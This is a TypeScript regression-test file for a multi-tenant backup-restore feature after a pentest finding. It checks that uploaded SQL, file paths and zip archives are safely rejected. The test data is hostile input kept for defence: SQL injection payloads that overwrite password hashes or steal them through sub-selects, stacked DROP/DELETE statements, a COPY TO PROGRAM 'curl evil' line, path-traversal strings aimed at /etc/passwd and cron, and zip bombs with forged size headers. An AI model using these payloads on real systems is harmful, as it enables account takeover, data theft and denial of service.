import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { deflateRawSync } from "node:zlib";
import { zipSync } from "fflate";
import { buildInsert, checkRestoreStatement, parseExportInserts, restorableObjectPath, safeUnzip, UnzipLimitError } from "./org-backup-safe";

/** Pentest 2026-11 KX-PT-01 (Critical): organization-backup restore executed uploaded SQL -> cross-tenant account takeover. These are the regression tests. */
const T = "tenant_A";
const one = (sql: string) => parseExportInserts(sql);

describe("parseExportInserts accepts only the exporter grammar", () => {
  it("parses a normal exporter line incl. escaped quotes, jsonb, NULL, booleans, numbers", () => {
    const { statements, rejected } = one(`-- Patients\nINSERT INTO "Patient" ("id", "tenantId", "name", "flag", "n", "x", "meta") VALUES ('p1', '${T}', 'O''Brien; DROP TABLE "User";--', TRUE, -12.5, NULL, '{"a":"it''s"}'::jsonb);\n`);
    assert.equal(rejected, 0); assert.equal(statements.length, 1);
    assert.equal(statements[0]!.values[2]!.kind, "str");
    assert.equal(buildInsert(statements[0]!), `INSERT INTO "Patient" ("id", "tenantId", "name", "flag", "n", "x", "meta") VALUES ('p1', '${T}', 'O''Brien; DROP TABLE "User";--', TRUE, -12.5, NULL, '{"a":"it''s"}'::jsonb)`);
  });
  const attacks: Record<string, string> = {
    "ON CONFLICT DO UPDATE (account takeover PoC)": `INSERT INTO "User" ("id","tenantId","passwordHash") VALUES ('victim','${T}','x') ON CONFLICT (id) DO UPDATE SET "passwordHash"='x';`,
    "INSERT ... SELECT exfiltration": `INSERT INTO "Patient" ("id","tenantId","name") SELECT id, '${T}', "passwordHash" FROM "User";`,
    "sub-select inside VALUES": `INSERT INTO "Patient" ("id","tenantId","name") VALUES ('p','${T}',(SELECT "passwordHash" FROM "User" LIMIT 1));`,
    "function call in VALUES": `INSERT INTO "Patient" ("id","tenantId","name") VALUES ('p','${T}',pg_sleep(10));`,
    "RETURNING clause": `INSERT INTO "Patient" ("id","tenantId") VALUES ('p','${T}') RETURNING id;`,
    "dollar quoting": `INSERT INTO "Patient" ("id","tenantId","name") VALUES ('p','${T}',$$x$$);`,
    "E-string backslash escape": `INSERT INTO "Patient" ("id","tenantId","name") VALUES ('p','${T}',E'\\'');`,
    "unquoted table": `INSERT INTO "Patient"; DELETE FROM x;`,
    "quote in identifier": `INSERT INTO "Pat""ient" ("id") VALUES ('p');`,
    "schema-qualified": `INSERT INTO public."Patient" ("id") VALUES ('p');`,
    "UPDATE statement": `UPDATE "User" SET "passwordHash"='x';`,
    "DROP statement": `DROP TABLE "User";`,
    "COPY": `COPY "User" TO PROGRAM 'curl evil';`,
    "column/value mismatch": `INSERT INTO "Patient" ("id","tenantId") VALUES ('p');`,
    "NUL byte": `INSERT INTO "Patient" ("id","tenantId") VALUES ('p\0','${T}');`,
    "invalid jsonb": `INSERT INTO "Patient" ("id","tenantId","m") VALUES ('p','${T}','{bad'::jsonb);`,
  };
  for (const [name, sql] of Object.entries(attacks)) {
    it(`rejects: ${name}`, () => { const r = one(sql); assert.equal(r.statements.length, 0, name); assert.ok(r.rejected >= 1); });
  }
  it("a stacked second statement is rejected and never rebuilt (the harmless first INSERT is all that survives)", () => {
    const r = one(`INSERT INTO "Patient" ("id","tenantId") VALUES ('p','${T}'); DELETE FROM "User";`);
    assert.equal(r.statements.length, 1); assert.ok(r.rejected >= 1); assert.ok(!buildInsert(r.statements[0]!).includes("DELETE"));
  });
  it("a bad line does not poison the next valid statement, and nothing rejected is rebuilt", () => {
    const r = one(`INSERT INTO "Patient" ("id") VALUES (pg_sleep(5));\nINSERT INTO "Patient" ("id","tenantId") VALUES ('ok','${T}');\n`);
    assert.equal(r.statements.length, 1); assert.equal(r.rejected, 1);
  });
  it("is linear on pathological input (no regex backtracking)", () => {
    const t0 = Date.now(); one("INSERT INTO \"Patient\" (" + '"a",'.repeat(50_000) + "\n" + "'".repeat(200_000)); one(`INSERT INTO "P" ("a") VALUES ('${"x".repeat(2_000_000)}`);
    assert.ok(Date.now() - t0 < 2000);
  });
});

describe("checkRestoreStatement enforces tenant ownership", () => {
  const st = (sql: string) => one(sql).statements[0]!;
  it("accepts own-tenant rows and reports the FKs to verify", () => {
    const v = checkRestoreStatement(st(`INSERT INTO "Appointment" ("id","tenantId","patientId","clinicianId","integrationClientId") VALUES ('a','${T}','pat','doc',NULL);`), T);
    assert.ok(v.ok); assert.deepEqual(v.ok && v.fks.map((f) => [f.column, f.parent, f.id]), [["patientId", "Patient", "pat"], ["clinicianId", "User", "doc"]]);
  });
  const deny: Array<[string, string, string]> = [
    ["another tenant's id", `INSERT INTO "Patient" ("id","tenantId") VALUES ('p','tenant_B');`, "CROSS_TENANT"],
    ["missing tenantId", `INSERT INTO "Patient" ("id") VALUES ('p');`, "TENANT_ID_REQUIRED"],
    ["NULL tenantId", `INSERT INTO "User" ("id","tenantId") VALUES ('u',NULL);`, "CROSS_TENANT"],
    ["Tenant row (plan/billing fields)", `INSERT INTO "Tenant" ("id") VALUES ('${T}');`, "TABLE_NOT_RESTORABLE"],
    ["global FeatureFlag", `INSERT INTO "FeatureFlag" ("key") VALUES ('x');`, "TABLE_NOT_RESTORABLE"],
    ["AuditLog (the audited cannot write the trail)", `INSERT INTO "AuditLog" ("id","tenantId") VALUES ('l','${T}');`, "TABLE_NOT_ALLOWED"],
    ["unlisted table", `INSERT INTO "Subscription" ("id","tenantId") VALUES ('s','${T}');`, "TABLE_NOT_ALLOWED"],
    ["platform super admin role", `INSERT INTO "User" ("id","tenantId","role") VALUES ('u','${T}','PLATFORM_SUPER_ADMIN');`, "ROLE_NOT_GRANTABLE"],
    ["platform role via additionalRoles", `INSERT INTO "User" ("id","tenantId","additionalRoles") VALUES ('u','${T}','{PLATFORM_SUPER_ADMIN}');`, "ROLE_NOT_GRANTABLE"],
    ["platform integration client link", `INSERT INTO "Appointment" ("id","tenantId","platformIntegrationClientId") VALUES ('a','${T}','pic_other');`, "COLUMN_NOT_RESTORABLE"],
    ["unknown foreign key column", `INSERT INTO "Patient" ("id","tenantId","mysteryId") VALUES ('p','${T}','x');`, "FOREIGN_KEY_NOT_ALLOWED"],
  ];
  for (const [name, sql, reason] of deny) it(`denies ${name}`, () => { const v = checkRestoreStatement(st(sql), T); assert.equal(v.ok, false); assert.equal(!v.ok && v.reason, reason); });
});

describe("restorableObjectPath (manifest is attacker-controlled)", () => {
  it("keeps files inside the tenant's folder only", () => {
    assert.equal(restorableObjectPath("patients", `${T}/p1/docs/a.pdf`, T), `${T}/p1/docs/a.pdf`);
    assert.equal(restorableObjectPath("patients", `./${T}/p1/a.pdf`, T), `${T}/p1/a.pdf`);
    for (const bad of ["../../etc/cron.d/x", `${T}/../tenant_B/p/a.pdf`, "/etc/passwd", "tenant_B/p1/a.pdf", `${T}//a`, `${T}\\..\\x`, "", `${T}/./a`]) assert.equal(restorableObjectPath("patients", bad, T), null, bad);
    assert.equal(restorableObjectPath("kiorly-payments", `${T}/a`, T), null);
    assert.equal(restorableObjectPath("imports", `${T}/a`, T), null);
    assert.equal(restorableObjectPath("../x", `${T}/a`, T), null);
  });
  it("avatar keys are allowed only for users of this tenant", () => {
    assert.equal(restorableObjectPath("users", "avatars/u_mine/a.png", T, new Set(["u_mine"])), "avatars/u_mine/a.png");
    assert.equal(restorableObjectPath("users", "avatars/u_other/a.png", T, new Set(["u_mine"])), null);
  });
});

describe("safeUnzip is a zip-bomb guard on ACTUAL inflated bytes", () => {
  const limits = { maxTotal: 1_000_000, maxEntries: 50, maxEntry: 600_000 };
  it("reads a normal archive", () => { const out = safeUnzip(zipSync({ "a.sql": new TextEncoder().encode("hi"), "files/x.bin": new Uint8Array(1000) }), limits); assert.equal(Object.keys(out).length, 2); });
  it("stops a classic bomb (small archive, huge output)", () => {
    const bomb = zipSync({ "organization-export.sql": new Uint8Array(50_000_000) }, { level: 9 });
    assert.ok(bomb.length < 100_000);
    assert.throws(() => safeUnzip(bomb, limits), UnzipLimitError);
  });
  it("stops many medium entries that only exceed the cap together", () => {
    const files: Record<string, Uint8Array> = {}; for (let i = 0; i < 20; i++) files[`f${i}.bin`] = new Uint8Array(500_000);
    assert.throws(() => safeUnzip(zipSync(files, { level: 9 }), limits), UnzipLimitError);
  });
  it("stops an archive that lies about its entry size in the directory (declares 1 byte, inflates 50 MB)", () => {
    const real = zipSync({ "a.bin": new Uint8Array(50_000_000) }, { level: 9 });
    const lie = Buffer.from(real);
    for (let i = 0; i + 4 <= lie.length; i++) if (lie.readUInt32LE(i) === 0x02014b50) lie.writeUInt32LE(1, i + 24); // central directory: uncompressed size
    for (let i = 0; i + 4 <= lie.length; i++) if (lie.readUInt32LE(i) === 0x04034b50) lie.writeUInt32LE(1, i + 22); // local header
    assert.throws(() => safeUnzip(new Uint8Array(lie), limits), UnzipLimitError);
  });
  it("limits the number of entries", () => {
    const files: Record<string, Uint8Array> = {}; for (let i = 0; i < 60; i++) files[`f${i}`] = new Uint8Array(1);
    assert.throws(() => safeUnzip(zipSync(files), limits), UnzipLimitError);
  });
  void deflateRawSync;
});
